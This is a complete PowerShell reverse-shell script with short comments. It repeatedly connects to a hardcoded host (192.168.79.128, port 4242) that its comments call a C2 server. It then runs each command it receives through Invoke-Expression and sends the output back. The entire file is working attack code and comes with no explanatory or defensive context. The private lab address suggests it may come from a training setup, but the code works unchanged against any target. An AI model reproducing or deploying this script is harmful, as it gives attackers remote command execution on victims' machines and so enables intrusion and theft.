do {
    #wait
    Start-Sleep -Seconds 1

    # Connect to C2
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('192.168.79.128', 4242)
    } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

# Writes a string to C2
function WriteToStream ($String) {
    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    # Write to C2
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}

# Initial output to C2. The function also creates the inital empty byte array buffer used below.
WriteToStream ''

# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and save output (including errors thrown)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }

    # Write output to C2
    WriteToStream ($Output)
}
# Closes the StreamWriter and the underlying TCPClient
$StreamWriter.Close()
